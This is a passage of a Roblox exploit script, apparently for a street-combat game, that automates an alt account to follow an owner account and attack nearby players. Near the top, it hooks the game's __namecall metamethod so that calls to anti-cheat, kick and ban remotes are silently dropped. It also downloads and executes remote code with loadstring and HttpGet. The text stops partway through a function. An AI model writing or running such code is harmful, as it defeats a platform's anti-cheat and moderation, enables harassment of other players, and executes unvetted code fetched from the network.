getgenv()._=

    'This script made by "agent.roblox99 and secret.script" | https://discord.gg/345NFC9mQm'

getgenv().AOCSettings = {
    --// ! Main ! \\--
    ['Owner'] = 'psykimi',
    ['Position'] = 'Back', --Position Of Stand [Back | Left | Right]
    ['CrewID'] = 2, --Must Be In Group For It To Work
    ['Attack'] = 'Heavy', --Heavy = Super Punch Light = Spam Punch [Heavy | Light]
    ['StandMode'] = 'OverHeaven', --[Star Platinum : OverHeaven | Star Platinum: The World | Star Platinum, Za Warudo! | TheWorld | Cmoon | King Crimson | Killer Queen | MIH | D4C]
    ['FlyMode'] = 'Heaven', --[Glide | Fly | Hover | Heaven | Swim]
    ['Prediction'] = 0.3, --Prediction For Attack Or Targetting
    ['GunPrediction'] = 0.037, --Prediction For Gun Kill
    ['AttackMode'] = 'Sky', --[Sky | Under] If [Sky] The Stand Will Attack Infront Of Then And If [Under] The Stand Will Attack In Underground
    ['GunMode'] = 'Under', --[Sky | Under]  The Stand Will Shooting Just Like What In The Settings
    ['Resolver'] = true, --[true | false] Turn On Or Off Resolver If Someone Using Anti Lock
    --// ! Misc ! \\--
    ['CustomSummon'] = 's', --Custom [Summon!] Text
    ['LowGraphics'] = true, --[true | false] Turns graphics down so your stand doesnt lag too much
    ['AntiStomp'] = true, --[true | false] The Stand Will Cannot Be Stomped Or Grabbed
    ['CustomName'] = 'My Owner!', --Custom Name Text Default Is [Master] Example Of it 'Im Here, Master!'
    ['Hidescreen'] = false, --[true | false] If [true] You WIll See White Blank Screen But The Performance Is Gonna Be Good]
    ['ChatCmds'] = true, --[true | false] Chatted When You Use Some Command
    ['MaskMode'] = 'Ninja', --[Surgeon | Paintball | Skull | Pumpkin | Hockey | Ninja | Riot] The Stand Will Buy The Mask You Selected
    ['AutoMask'] = true, --[true | false] Auto Buy Mask When The Stand Respawn
    ['60'] = true, --[false | 'NUMBER'] This is so your main account gets the most fps (MAXED IS 60, SUGGEST 30 FPS ON STANDS)
    ['Msg'] = 'AOC ON TOP.', --When You Say [/e msg] It Makes All The Alts Say That Message
    ['Alt'] = false,
    --//    ! Sounds !     \\--
    --\\ MUST HAVE BOOMBOX //--
    ['Sounds'] = true,
    ['SummonMusic'] = true, --[true | false]
    ['CustomSong'] = 1839246711 --Enter A Song ID And Say 'Song!
}
    if getgenv()._== 'This script made by "agent.roblox99 and secret.script" | https://discord.gg/345NFC9mQm' then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-547.482239, 173.374954, -0.0784880966)
    StandOwner = getgenv().AOCSettings.Owner
    Pos = getgenv().AOCSettings.Position
    CrewID = getgenv().AOCSettings.CrewID
    Attack = getgenv().AOCSettings.Attack
    StandMode = getgenv().AOCSettings.StandMode
    FlyMode = getgenv().AOCSettings.FlyMode
    Prediction = getgenv().AOCSettings.Prediction
    gunkillprediction = getgenv().AOCSettings.GunPrediction
    CustomName = getgenv().AOCSettings.CustomName
    AutoMask = getgenv().AOCSettings.AutoMask
    MaskMode = getgenv().AOCSettings.MaskMode
    ChatCmds = getgenv().AOCSettings.ChatCmds
    AttackMode = getgenv().AOCSettings.AttackMode
    GunMode = getgenv().AOCSettings.GunMode
    PosingType = getgenv().AOCSettings.Posing
    Hidescreen = getgenv().AOCSettings.Hidescreen
    Smoothing = getgenv().AOCSettings.Smoothing
    Sounds = getgenv().AOCSettings.Sounds
    SummonMusic = getgenv().AOCSettings.SummonMusic
    VanishAppear = getgenv().AOCSettings.VanishAppearSound
    CustomSong = getgenv().AOCSettings.CustomSong
    resolve = getgenv().AOCSettings.Resolver
    Bind = getgenv().AOCSettings.AntiStomp
    Fpscap = getgenv().AOCSettings.FPSCAP
    lowgraphics = getgenv().AOCSettings.LowGraphics
    Alt = getgenv().AOCSettings.Alt
    game.Workspace.FallenPartsDestroyHeight = -1005
    AutoPredic = Prediction
    AutoGunPredic = gunkillprediction
    local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/XK5NG/XK5NG.github.io/main/Notify"))()
    getgenv().ScriptName = 'OSGC stand v3.3'
    local ScriptName = getgenv().ScriptName
    local Notify = NotifyLibrary.Notify
    if getgenv().StandLoaded ~= nil then
        Notify({Title = "Already Executed!",Duration = 5})
        Notify({Title = "Already Executed!",Duration = 5})
        Notify({Title = "Already Executed!",Duration = 5})
        Notify({Title = "Already Executed!",Duration = 5})
        return
    end
    if game:GetService("Players"):FindFirstChild(StandOwner) then
        Notify({Title = "Owner Found! ['Owner'] = '"..StandOwner.."'",Duration = 3.4028235e+38})
        getgenv().StandLoaded = true else
        Notify({Title = "Owner Is Not In Server Or The User Invalid",Duration = 30})
        Notify({Title = "Please Check The User On Stand Setting",Duration = 30})
        Notify({Title = "And Try Re Execute!",Duration = 30})
        Notify({Title =  "['Owner'] = '"..StandOwner.."',",Duration = 30})
        return
    end
    
    STAND = game:GetService('Players').LocalPlayer
    OWNER = game:GetService("Players"):FindFirstChild(StandOwner)
    rs = game:GetService("RunService")
    function getRoot(v)local rootPart = v.Character:FindFirstChild('HumanoidRootPart') return rootPart end
    function getTorso(v)local Torso = v.Character:FindFirstChild('UpperTorso')return Torso end
    function getHumanoid(v)local Humanoid = v.Character:FindFirstChildOfClass("Humanoid")return Humanoid end
    function KO(v)local KOEffect = v.Character:FindFirstChild('BodyEffects'):FindFirstChild('K.O')return KOEffect end
    function Dead(v)local DeadEffect = v.Character:FindFirstChild('BodyEffects'):FindFirstChild('Dead')return DeadEffect end
    function Attacking(v) local Attacks = v.Character:FindFirstChild('BodyEffects'):FindFirstChild('Attacking') return Attacks end
    
    grm = getrawmetatable(game)
    setreadonly(grm, false)
    old = grm.__namecall
    grm.__namecall = newcclosure(function(self, ...)
        local args = {...}
        if tostring(args[1]) == "TeleportDetect" then
            return
        elseif tostring(args[1]) == "CHECKER_1" then
            return
        elseif tostring(args[1]) == "CHECKER" then
            return
        elseif tostring(args[1]) == "GUI_CHECK" then
            return
        elseif tostring(args[1]) == "OneMoreTime" then
            return
        elseif tostring(args[1]) == "checkingSPEED" then
            return
        elseif tostring(args[1]) == "BANREMOTE" then
            return
        elseif tostring(args[1]) == "PERMAIDBAN" then
            return
        elseif tostring(args[1]) == "KICKREMOTE" then
            return
        elseif tostring(args[1]) == "BR_KICKPC" then
            return
        elseif tostring(args[1]) == "BR_KICKMOBILE" then
            return
        end
        return old(self, ...)
    end)
    
    STAND.Idled:connect(function() game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(1) game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end)
    
    if tonumber(Fpscap) then
        _G.FPS = Fpscap
        local clock = tick()
        _G.fps = true 
        rs.Stepped:connect(function()
            if _G.fps == true then
                while clock + 1 / _G.FPS > tick() do end
                wait()
                clock = tick()
            end
        end)
    end
    
    setfflag("HumanoidParallelRemoveNoPhysics", "False");
    setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False");
    
    for i, _ in pairs(game.Workspace:GetDescendants()) do if _:IsA("Seat") then _:Destroy() end end
    
    local fake = Instance.new("Part",game.workspace);
    fake.Name = "fake";
    fake.Anchored = true;
    fake.Size = Vector3.new(50, 5, 50);
    fake.CFrame = CFrame.new(0, -1005, 0);
    
    local float = Instance.new("Part",game.Workspace)
    float.Name = "FLOATPART"
    float.Transparency = 1
    float.Anchored = true
    float.Size = Vector3.new(6,1,6)
    
    if lowgraphics == true then
        local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
        local g = game
        local w = g.Workspace
        local l = g.Lighting
        local t = w.Terrain
        t.WaterWaveSize = 0
        t.WaterWaveSpeed = 0
        t.WaterReflectance = 0
        t.WaterTransparency = 0
        l.GlobalShadows = false
        l.FogEnd = 9e9
        l.Brightness = 0
        settings().Rendering.QualityLevel = "Level01"
        for i, v in pairs(g:GetDescendants()) do
            if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                v.Material = "Plastic"
                v.Reflectance = 0
            elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                v.Transparency = 1
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                v.Lifetime = NumberRange.new(0)
            elseif v:IsA("Explosion") then
                v.BlastPressure = 1
                v.BlastRadius = 1
            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                v.Enabled = false
            elseif v:IsA("MeshPart") then
                v.Material = "Plastic"
                v.Reflectance = 0
                v.TextureID = 10385902758728957
            end
        end
        for i, e in pairs(l:GetChildren()) do
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end
        print("Low Graphics Enabled!")
    end
    --local
    local delta = 0
    local duration = 0.7
    local StopHoverAnim = false
    local Move = 0
    local reversing = false
    local StudLimit = 75
    function Stop()
        getHumanoid(STAND):UnequipTools()
        Stompnear = false
        Knockyes = false
        StopHoverAnim = false
        follow = false
        looking = false
        noclip = false
        vanish = false
        bring = false
        Knocked = false
        Kills = false
        StompTarget = false
        circle = false
        Arrest = false
        Frame = false
        knifenear = false
        killnear = false
        Viewing = false
        barragepos = false
        barragepunch = false
        mimicpunch = false
        block = false
        mimic = false
        GunKnock = false
        GunStomp = false
        Strafe = false
        Locking = false
        ORA = false
        Stab = false
        Line = false
        Stabbing = false
        AutoWeight = false
        Annoy = false
        KnifeKills = false
        KnifeAnnoy = false
        autodrop = false
        lettucefarm = false
        Glitch = false
        SMITE = false
        Bagging = false
        Sneak = false
        boxing = false
        gunnear = false
        rs:UnbindFromRenderStep("FOG")
        if STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity"):Destroy() end
        if getRoot(STAND):FindFirstChild("BodyPosition") then getRoot(STAND).BodyPosition:Destroy()end
        if getRoot(STAND):FindFirstChild("BodyGyro") then getRoot(STAND).BodyGyro:Destroy()end
    end
    Stop()
    
    function Buy(Item,Price,ItemName)
        repeat rs.Stepped:Wait()
            for i,v in pairs(STAND.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CanCollide = false
                end
            end
            game.Workspace.Camera.CameraSubject = game.Workspace.Ignored.Shop[Item.." - $"..Price].Head
            getRoot(STAND).CFrame=game.Workspace.Ignored.Shop[Item.." - $"..Price].Head.CFrame*CFrame.new(0,-5,0)
            fireclickdetector(game.Workspace.Ignored.Shop[Item.." - $"..Price].ClickDetector)
        until STAND.Backpack:FindFirstChild(ItemName)
        game.Workspace.Camera.CameraSubject = getHumanoid(STAND)
    end
    
    function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    function EquipGun(GUN)
        if STAND.Backpack:FindFirstChild(GUN) then
            STAND.Backpack:FindFirstChild(GUN).Parent = STAND.Character
            if GunMode == 'Sky' then
                GripPos(-7)
            elseif GunMode == 'Under' then
                GripPos(7)
            end
        end
    end
    
    function GripPos(Y)
        local LastObject = STAND.Character:FindFirstChildOfClass("Tool")
        getHumanoid(STAND):UnequipTools() wait(.1)
        LastObject.GripPos = Vector3.new(-0,-Y,0) wait(.1)
        STAND.Character:FindFirstChild("Humanoid"):EquipTool(LastObject)
    end
    
    function Fire(Gun,Activate)
        if STAND.Backpack:FindFirstChild(Gun)then
            STAND.Backpack:FindFirstChild(Gun).Parent = STAND.Character 
        elseif STAND.Character:FindFirstChild(Gun) then
            if Activate == true then 
                STAND.Character:FindFirstChild(Gun):Activate()
            elseif Activate == false then
                STAND.Character:FindFirstChild(Gun):Deactivate()
            end 
        end
    end
    
    function Hit()
        x = STAND.Character:FindFirstChildWhichIsA("Tool")
        if Attack == 'Heavy' then
            x:Activate()
        elseif Attack == 'Light' then
            x:Activate()
            x:Deactivate()
        end
    end
    
    function Equip(Tools)
        if not STAND.Character:FindFirstChild(Tools) then
            STAND.Backpack:FindFirstChild(Tools).Parent = STAND.Character
        end   
    end
    
    --[[function KnifeHit()
        if Attack == 'Heavy' then
            if STAND.Character:FindFirstChild('[Pitchfork]') then
                STAND.Character:FindFirstChild('[Pitchfork]'):Activate()
            else
                STAND.Backpack:FindFirstChild('[Pitchfork]').Parent = STAND.Character
            end   
        else
            if Attack == 'Light' then
                if STAND.Character:FindFirstChild('[Pitchfork]') then
                    STAND.Character:FindFirstChild('[Pitchfork]'):Activate()
                    STAND.Character:FindFirstChild('[Pitchfork]'):Deactivate()
                else
                    STAND.Backpack:FindFirstChild('[Pitchfork]').Parent = STAND.Character
                end  
            end
        end
    end]]
    
    function Dweld()
        local Stuff = {
            "RightHand",
            "LeftHand",
            "RightFoot",
            "LeftFoot",
            "Head"
        }
    
        pcall(function()
            for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                for z, BreakingStuff in ipairs(Stuff) do
                    if v.Name == BreakingStuff then
                        if v:FindFirstChildOfClass("Motor6D") then
                            local Weld = v:FindFirstChildOfClass("Motor6D")
                            Weld:Destroy()
                        end
                    end
                end
            end
        end)
    end
    
    function LowerArm(TP)
        for i,v in pairs(STAND.Character:GetDescendants()) do
            if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                v.CanCollide = false
            end
        end
        Dweld()
        STAND.Character:FindFirstChild('RightUpperArm').CFrame = TP
        STAND.Character:FindFirstChild('RightHand').CFrame = TP
        STAND.Character:FindFirstChild('LeftHand').CFrame = TP
        STAND.Character:FindFirstChild('LeftFoot').CFrame = TP
        STAND.Character:FindFirstChild('RightFoot').CFrame = TP
        STAND.Character:FindFirstChild('Head').CFrame = TP
    end
    
    function Reload()
        if STAND.Character:FindFirstChildWhichIsA("Tool") then
            if STAND.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
                if STAND.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
                    if STAND.Character:FindFirstChild('BodyEffects'):FindFirstChild('Reload').Value == false then
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload",STAND.Character:FindFirstChildWhichIsA("Tool"))
                    end
                end
            end
        end
    end
    
    function Reset()
        game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
        getHumanoid(STAND):ChangeState'Dead'
    end
    
    function TargetMalee(TARGET)
          if not STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then
            local bv = Instance.new("BodyVelocity", STAND.Character.Head)
            bv.velocity = Vector3.new(0,0,0)
            bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
        end
        rs.heartbeat:wait()
        q = getRoot(TARGET)
        w = TARGET.Character:FindFirstChild('Head')
        e = getHumanoid(TARGET)
        t = getRoot(STAND)
        t.Velocity = Vector3.new(0,0,0)
        for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
        if game.Workspace.Vehicles:FindFirstChild(TARGET.Name) then
            t.CFrame = CFrame.new(game.Workspace.Vehicles[TARGET.Name].Position)*CFrame.new(game.Workspace.Vehicles[TARGET.Name].Velocity*.4)*CFrame.new(0,0,0)
        else
            if resolve == true then
                if AttackMode == "Under" then
                    if STAND.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk") then
                        t.CFrame = CFrame.new(q.Position + Vector3.new(0,-6.8,0) + (e.MoveDirection*AutoPredic*e.WalkSpeed))*CFrame.Angles(math.pi*0.5,0,0)
                    else
                        t.CFrame = q.CFrame*CFrame.new(0,500,0)
                    end
                else
                    if AttackMode == "Sky" then
                        if STAND.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk") then
                            t.CFrame = CFrame.new(q.Position + Vector3.new(0,SkyP,0) + (e.MoveDirection*AutoPredic*e.WalkSpeed))
                        else
                            t.CFrame = q.CFrame*CFrame.new(0,500,0)
                        end
                    end		
                end
            else
                if AttackMode == "Under" then
                    if STAND.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk") then
                        t.CFrame = CFrame.new(q.Position.X+(w.Velocity.X*AutoPredic),q.Position.Y+(w.Velocity.Y*0.1),q.Position.Z+(w.Velocity.Z*AutoPredic))*CFrame.new(0,-6.8,0)*CFrame.Angles(math.pi*0.5,0,0)
                    else
                        t.CFrame = q.CFrame*CFrame.new(0,500,0)
                    end
                else
                    if AttackMode == "Sky" then
                        if STAND.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk") then
                            t.CFrame = CFrame.new(q.Position.X+(w.Velocity.X*AutoPredic),q.Position.Y+(w.Velocity.Y*0.1),q.Position.Z+(w.Velocity.Z*AutoPredic))*CFrame.new(0,0,0)
                        else
                            t.CFrame = q.CFrame*CFrame.new(0,500,0)
                        end
                    end		
                end
            end
            game.Workspace.Camera.CameraSubject = getHumanoid(TARGET)
        end
    end
    
    function TargetKnife(TARGET)
        rs.heartbeat:wait()
        getHumanoid(STAND):ChangeState(16)
        game.Workspace.Camera.CameraSubject = getHumanoid(TARGET)
        for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
        if game.Workspace.Vehicles:FindFirstChild(TARGET.Name) then
            getRoot(STAND).CFrame = CFrame.new(game.Workspace.Vehicles[TARGET.Name].Position)*CFrame.new(game.Workspace.Vehicles[TARGET.Name].Velocity*.4)*CFrame.new(0,0,0)
        else
            if resolve == true then
                getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Position + Vector3.new(0,-6.8,0) + (getHumanoid(TARGET).MoveDirection*AutoPredic*getHumanoid(TARGET).WalkSpeed))*CFrame.Angles(math.pi*0.5,0,0)
            else
                getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Position.X+(getRoot(TARGET).Velocity.X*AutoPredic),getRoot(TARGET).Position.Y+(getRoot(TARGET).Velocity.Y*0),getRoot(TARGET).Position.Z+(getRoot(TARGET).Velocity.Z*AutoPredic))*CFrame.new(0,-6.8,0)*CFrame.Angles(math.pi*0.5,0,0)
            end
        end	
    end
    
    function Bring(Target)
        rs.Heartbeat:wait()
        Stop()
        bring = true
        noclip = true
        if KO(TARGET).Value == false then
            game.Workspace.Camera.CameraSubject = getHumanoid(STAND)
            repeat rs.heartbeat:Wait()
                if KO(TARGET).Value == false then
                    Equip('Combat') Hit()
                    TargetMalee(Target)
                    game.Workspace.Camera.CameraSubject = getRoot(TARGET)
                end
            until KO(TARGET).Value == true or bring == false
    
            repeat rs.heartbeat:Wait()
                getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
            until Attacking(STAND).Value == false
            if Alt == false then
                repeat rs.heartbeat:Wait()
                    if KO(TARGET).Value == true then
                        getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,3,0)
                        wait(.2)
                        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                        wait(.3)
                        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,2,3)
                    end
                until TARGET.Character:FindFirstChild('GRABBING_CONSTRAINT') or KO(TARGET).Value == false or bring == false
            end
            Summon()
        else
            if Alt == false then
                repeat rs.heartbeat:Wait()
                    if KO(TARGET).Value == true then
                        getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,3,0)
                        wait(.2)
                        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                        wait(.3)
                        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,2,3)
                    end
                until TARGET.Character:FindFirstChild('GRABBING_CONSTRAINT') or KO(TARGET).Value == false or bring == false
            end
            Summon()
        end
    end
    
    
    
    
    
    
    
    
    
    
    function GetNearest()
        local ClosestPlayer
        local ClosestDistance = math.huge
        for _,v in pairs(game.Players:GetPlayers()) do
            if v.Character and OWNER.Character then
                if v.Character:FindFirstChild('BodyEffects') and v.Character:FindFirstChild('BodyEffects'):FindFirstChild('Defense') and v.Character:FindFirstChild('BodyEffects'):FindFirstChild('BreakingParts') then
                    if v ~= OWNER and v:FindFirstChild('DataFolder') and v:FindFirstChild('DataFolder'):FindFirstChild('Information') then
                        if v.Character:WaitForChild('BodyEffects')['K.O'].Value == false then
                            if v:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew') then
                                if v.Character:FindFirstChild('HumanoidRootPart') then
                                    if v.DataFolder.Information.Crew.Value ~= OWNER.DataFolder.Information.Crew.Value or not v.DataFolder.Information:FindFirstChild('Crew') then
                                        local Distance = (v.Character:FindFirstChild('HumanoidRootPart').Position - getRoot(OWNER).Position).Magnitude
                                        if Distance < ClosestDistance then
                                            if Distance <= StudLimit then
                                                ClosestDistance = Distance
                                                ClosestPlayer = v
                                            end
                                        end
                                    end
                                end
                            else
                                if v.Character:FindFirstChild('HumanoidRootPart') then
                                    local Distance = (v.Character:FindFirstChild('HumanoidRootPart').Position - getRoot(OWNER).Position).Magnitude
                                    if Distance < ClosestDistance then
                                        if Distance <= StudLimit then
                                            ClosestDistance = Distance
                                            ClosestPlayer = v
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        return ClosestPlayer
    end
    
    function GetNearest2()
        local ClosestPlayer
        local ClosestDistance = math.huge
        for _,v in pairs(game.Players:GetPlayers()) do
            if v.Character and OWNER.Character then
                if v.Character:FindFirstChild('BodyEffects') and v.Character:FindFirstChild('BodyEffects'):FindFirstChild('Defense') and v.Character:FindFirstChild('BodyEffects'):FindFirstChild('BreakingParts') then
                    if v ~= OWNER and v:FindFirstChild('DataFolder') and v:FindFirstChild('DataFolder'):FindFirstChild('Information') then
                        if v.Character:WaitForChild('BodyEffects')['K.O'].Value == true then
                            if v:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew') then
                                if v.Character:FindFirstChild('HumanoidRootPart') then
                                    if v.DataFolder.Information.Crew.Value ~= OWNER.DataFolder.Information.Crew.Value or not v.DataFolder.Information:FindFirstChild('Crew') then
                                        local Distance = (v.Character:FindFirstChild('HumanoidRootPart').Position - getRoot(OWNER).Position).Magnitude
                                        if Distance < ClosestDistance then
                                            if Distance <= StudLimit then
                                                ClosestDistance = Distance
                                                ClosestPlayer = v
                                            end
                                        end
                                    end
                                end
                            else
                                if v.Character:FindFirstChild('HumanoidRootPart') then
                                    local Distance = (v.Character:FindFirstChild('HumanoidRootPart').Position - getRoot(OWNER).Position).Magnitude
                                    if Distance < ClosestDistance then
                                        if Distance <= StudLimit then
                                            ClosestDistance = Distance
                                            ClosestPlayer = v
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        return ClosestPlayer
    end
    
    --Animations
    function ANIMATION()
        if not game:GetService("Workspace"):FindFirstChild("barrage1") and not game:GetService("Workspace"):FindFirstChild("barrage2") and not game:GetService("Workspace"):FindFirstChild("barrage3") and not game:GetService("Workspace"):FindFirstChild("barrage4") then
            local barrage1 = Instance.new('Animation',game:GetService("Workspace"))
            barrage1.AnimationId = 'rbxassetid://8254787838'
            barrage1.Name = "barrage1"
            local barrage2 = Instance.new('Animation',game:GetService("Workspace"))
            barrage2.AnimationId = 'rbxassetid://8254789608'
            barrage2.Name = "barrage2"
            local barrage3 = Instance.new('Animation',game:GetService("Workspace"))
            barrage3.AnimationId = 'rbxassetid://8254792138'
            barrage3.Name = "barrage3"
            local barrage4 = Instance.new('Animation',game:GetService("Workspace"))
            barrage4.AnimationId = 'rbxassetid://8254794168'
            barrage4.Name = "barrage4"
            Barraging1 = getHumanoid(STAND):LoadAnimation(barrage1)
            Barraging2 = getHumanoid(STAND):LoadAnimation(barrage2)
            Barraging3 = getHumanoid(STAND):LoadAnimation(barrage3)
            Barraging4 = getHumanoid(STAND):LoadAnimation(barrage4)
        else
            local barrage1 = game:GetService("Workspace").barrage1
            local barrage2 = game:GetService("Workspace").barrage2
            local barrage3 = game:GetService("Workspace").barrage3
            local barrage4 = game:GetService("Workspace").barrage4
            Barraging1 = getHumanoid(STAND):LoadAnimation(barrage1)
            Barraging2 = getHumanoid(STAND):LoadAnimation(barrage2)
            Barraging3 = getHumanoid(STAND):LoadAnimation(barrage3)
            Barraging4 = getHumanoid(STAND):LoadAnimation(barrage4)
        end
    
        if not game:GetService("Workspace"):FindFirstChild("FLY") and
        not game:GetService("Workspace"):FindFirstChild("HOVER") and 
        not game:GetService("Workspace"):FindFirstChild("HOVERV2") and 
        not game:GetService("Workspace"):FindFirstChild("HOVERV3") and 
        not game:GetService("Workspace"):FindFirstChild("GLIDE") then
            local Hover = Instance.new('Animation',game:GetService("Workspace"))
            local Glide = Instance.new('Animation',game:GetService("Workspace"))
            local Fly = Instance.new('Animation',game:GetService("Workspace"))
            local HoverV2 = Instance.new('Animation',game:GetService("Workspace"))
            local HoverV3 = Instance.new('Animation',game:GetService("Workspace"))
            Hover.AnimationId = 'rbxassetid://3541114300'
            Glide.AnimationId = 'rbxassetid://3084858603'
            Fly.AnimationId = 'rbxassetid://3541044388'
            HoverV2.AnimationId = 'rbxassetid://13850634687'
            HoverV3.AnimationId = 'rbxassetid://13815170144'
            Hover.Name = "HOVER"
            Glide.Name = "GLIDE"
            Fly.Name = "FLY"
            HoverV2.Name = "HOVERV2"
            HoverV3.Name = "HOVERV3"
            GLIDE = getHumanoid(STAND):LoadAnimation(Glide)
            FLY = getHumanoid(STAND):LoadAnimation(Fly)
            HOVER = getHumanoid(STAND):LoadAnimation(Hover)
            HOVERV2 = getHumanoid(STAND):LoadAnimation(HoverV2)
            HOVERV3 = getHumanoid(STAND):LoadAnimation(HoverV3)
        else
            GLIDE = getHumanoid(STAND):LoadAnimation(game:GetService("Workspace").GLIDE)
            FLY = getHumanoid(STAND):LoadAnimation(game:GetService("Workspace").FLY)
            HOVER = getHumanoid(STAND):LoadAnimation(game:GetService("Workspace").HOVER)
            HOVERV2 = getHumanoid(STAND):LoadAnimation(game:GetService("Workspace").HOVERV2)
            HOVERV3 = getHumanoid(STAND):LoadAnimation(game:GetService("Workspace").HOVERV3)
        end
        -- Poses :
        if not game:GetService("Workspace"):FindFirstChild("TopRock") then
            TopRock = Instance.new('Animation',game:GetService("Workspace"));
            TopRock.AnimationId = 'rbxassetid://3361276673';
            TopRock.Name = 'TopRock';
            Pose1 = getHumanoid(STAND):LoadAnimation(TopRock);
            Pose1.Looped = true;
            Pose1.Priority = Enum.AnimationPriority.Action;
        else
            TopRock = game:GetService("Workspace"):FindFirstChild("TopRock");
            Pose1 = getHumanoid(STAND):LoadAnimation(TopRock);
            Pose1.Looped = true;
            Pose1.Priority = Enum.AnimationPriority.Action;
        end
        
        if not game:GetService("Workspace"):FindFirstChild("Beckon") then
            Beckon = Instance.new('Animation',game:GetService("Workspace"));
            Beckon.AnimationId = 'rbxassetid://5230598276';
            Beckon.Name = 'Beckon';
            Pose2 = getHumanoid(STAND):LoadAnimation(Beckon);
            Pose2.Looped = true;
            Pose2.Priority = Enum.AnimationPriority.Action;
        else
            Beckon = game:GetService("Workspace"):FindFirstChild("Beckon");
            Pose2 = getHumanoid(STAND):LoadAnimation(Beckon);
            Pose2.Looped = true;
            Pose2.Priority = Enum.AnimationPriority.Action;
        end
        
        if not game:GetService("Workspace"):FindFirstChild("Godlike") then
            Godlike = Instance.new('Animation', game:GetService("Workspace"));
            Godlike.AnimationId = 'rbxassetid://3337994105';
            Godlike.Name = 'Godlike';
            Pose3 = getHumanoid(STAND):LoadAnimation(Godlike);
            Pose3.Looped = true;
            Pose3.Priority = Enum.AnimationPriority.Action;
        else
            Godlike = game:GetService("Workspace"):FindFirstChild("Godlike");
            Pose3 = getHumanoid(STAND):LoadAnimation(Godlike);
            Pose3.Looped = true;
            Pose3.Priority = Enum.AnimationPriority.Action;
        end
    end
    
    
    ANIMATION()	  
    
    function MoveTo(X,Y,Z)  
        getHumanoid(STAND):ChangeState(8)
        if STAND.Character.Head:FindFirstChildWhichIsA("Motor6D") then
            rs.Heartbeat:Wait()
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(X,Y,Z)
        else
            rs.Heartbeat:Wait()
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(X,Y,Z)
            STAND.Character:FindFirstChild('RightHand').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('LeftHand').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('RightFoot').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('LeftFoot').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            STAND.Character:FindFirstChild('Head').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
        end
    end
    
    function MoveToTarget(X,Y,Z)  
        getHumanoid(STAND):ChangeState(8)
        if STAND.Character.Head:FindFirstChildWhichIsA("Motor6D") then
            if not getRoot(STAND):FindFirstChildWhichIsA("BodyPosition") then
                local BP = Instance.new("BodyPosition",getRoot(STAND))
                BP.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
                BP.P = 3500
                BP.D = 500
